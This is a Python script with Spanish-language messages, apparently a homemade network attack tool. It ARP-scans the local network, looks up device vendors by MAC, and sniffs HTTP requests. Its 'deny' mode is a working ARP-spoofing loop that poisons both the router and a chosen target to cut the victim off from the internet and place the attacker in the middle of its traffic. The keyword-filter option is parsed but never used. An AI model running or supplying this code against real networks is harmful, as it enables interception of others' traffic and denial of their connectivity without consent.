#!/usr/bin/python3
 
 
import scapy.all as scapy
import subprocess as sp
from colorama import Back, Fore, Style
import re, requests, sys, signal, argparse
from pwn import *
from scapy.layers import http
 
url = "https://macvendors.com/query/"

print(len(sys.argv))

def sig_handler(sig, frame):
    print(Fore.YELLOW + "\n\n\t[!] " + Style.RESET_ALL + "Saliendo...\n")
    sys.exit(0)
 
signal.signal(signal.SIGINT, sig_handler)
 
def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    client_list = []
    print("\n")
    for i in answered:
        client_dict = {"ip": i[1].psrc, "mac": i[1].hwsrc}
        client_list.append(client_dict)
    return client_list
 
def print_result(client_list):
    print("\n\tIP\t\t\tMAC address\t\tVendor\n\t---------------------------------------------------------------")
    for client in client_list:
        response = requests.request("GET", url + client["mac"])
        if len(response.text) > 50:
            print("Demasiadas peticiones")
        else:
            print(Fore.GREEN + "\t[+] " + Style.RESET_ALL + client["ip"] + "\t\t" + client["mac"] + "\t" + response.text)
 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    mac = answered[0][1].hwsrc
    return mac
 
def deny(router_ip, router_mac, target_ip, target_mac):
    print("\t")
    p1 = log.progress(Fore.RED + "[+] " + Style.RESET_ALL + "Spoofing router..." + "\t" + Fore.GREEN + router_ip + Style.RESET_ALL)
    print("\t")
    p2 = log.progress(Fore.RED + "[+] " + Style.RESET_ALL + "Denying internet..." + "\t" + Fore.GREEN + target_ip + Style.RESET_ALL + "\n")
    packet4router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
    packet4target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
 
    while True:
        scapy.send(packet4router, verbose=False)
        scapy.send(packet4target, verbose=False)
 
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=print_data)

def print_data(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())
 
 
if __name__ == "__main__":
 
    parser = argparse.ArgumentParser(description='Lista de argumentos')
    parser.add_argument('-s', '--scan', help='scan for ips in your local network', action='store_true')
    parser.add_argument('-d', '--deny', help='give ip target in the same network to deny internet')
    parser.add_argument('-r', '--router', help='set router to deny')
    parser.add_argument('-f', '--sniff', help='choose ip to sniff, requires -k argument to choose words')
    parser.add_argument('-k', '--keyword', nargs='+', help='filter packets with keywords')
    parser.add_argument('-m', '--mac', help='analizar una mac')
    args = parser.parse_args()
 
    if args.deny:
        router_ip = sp.getoutput("route | grep default | awk '{print $2}'")
        router_mac = get_mac(router_ip)
        target_ip = args.deny
        target_mac = get_mac(target_ip)
        deny(router_ip, router_mac, target_ip, target_mac)
 
    if args.scan:
        router_ip = sp.getoutput("route | grep default | awk '{print $2}'")
        client_list = scan(router_ip + "/24")
        print_result(client_list)
 
    if args.mac:
        response = requests.request("GET", url + args.mac)
        if len(response.text) > 50:
            print("Error en la peticion")
        else:
            print("\tMAC address\t\tVendor\n\t--------------------------------------------------")
            print(Fore.GREEN + "\t[+]" + Style.RESET_ALL + args.mac + "\t" + response.text)
 
    if args.sniff:
        interface = sp.getoutput("ifconfig | head -1 | tr -d ':' | awk '{print $1}'")
        sniff(interface)
    
    if args.keyword:
        interface = sp.getoutput("ifconfig | head -1 | tr -d ':' | awk '{print $1}'")
        print(interface)
        filters = args.keyword
        sniff(interface)
        
 
    if not len(sys.argv) > 1:
        parser.print_help()
